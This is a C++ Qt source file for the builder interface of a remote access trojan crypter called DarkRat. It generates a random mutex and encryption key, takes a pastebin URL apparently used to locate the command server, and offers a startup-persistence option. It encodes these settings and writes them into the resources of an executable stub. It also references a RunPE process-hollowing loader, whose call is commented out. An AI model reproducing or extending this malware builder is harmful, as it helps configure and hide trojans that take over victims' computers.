#include "DarkRatCrypterUI.h"
#include <filesystem>

#include "RawBuilder.h"
#include "RunPe.h"

std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}



DarkRatCrypterUI::DarkRatCrypterUI(QWidget *parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);

	ui.mutex->setText(QString::fromStdString(random_string(5)));
	ui.encryptionkey->setText(QString::fromStdString(random_string(5)));
//	ui.output->setText("Output.exe");
}
char output[MAX_PATH];


void DarkRatCrypterUI::on_selectPayload_clicked()
{
	QString filename = QFileDialog::getOpenFileName(this, "Open a File", QDir::currentPath(), "Executable Files (*.exe)");
//	ui.inputFileLable->setText("File: " + filename);
}



void DarkRatCrypterUI::on_gen_mutex_clicked()
{
	ui.mutex->setText(QString::fromStdString(random_string(5)));
}

void DarkRatCrypterUI::on_gen_enckey_clicked()
{
	ui.encryptionkey->setText(QString::fromStdString(random_string(5)));
}


void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

void DarkRatCrypterUI::on_build_clicked()
{
	
	std::string startup;
	if (ui.startup->isChecked()) {
		startup = "true";
	}
	else {
		startup = "false";
	}


	std::string pastebinURl = ui.pastebinurl->text().toStdString();
	std::string mutex = ui.mutex->text().toStdString();
	std::string encryptionKey = ui.encryptionkey->text().toStdString();


	std::string buildString = pastebinURl+" "+ mutex+" "+ startup+ " "+ encryptionKey;

	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);


	std::string json = "{ { \"ek\", "+ encryptionKey +"} ,{ \"pu\", "+ pastebinURl+" },{ \"mux\", "+mutex+" },{ \"sup\", "+ startup +" },{ \"ri\", 5 },{ \"pn\", {\"FOO\", \"BAR\"} } }";
	
	QString b64string = QString::fromStdString(json).toUtf8().toBase64();
	std::string write = b64string.toStdString();
	char* c_write = &write[0u];
	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
	//int status = RunPortableExecutable(rawData, buildString);
	
//	ui.statusBar->showMessage(QString::fromStdString(doc.toJson()) , 1000);
	
}
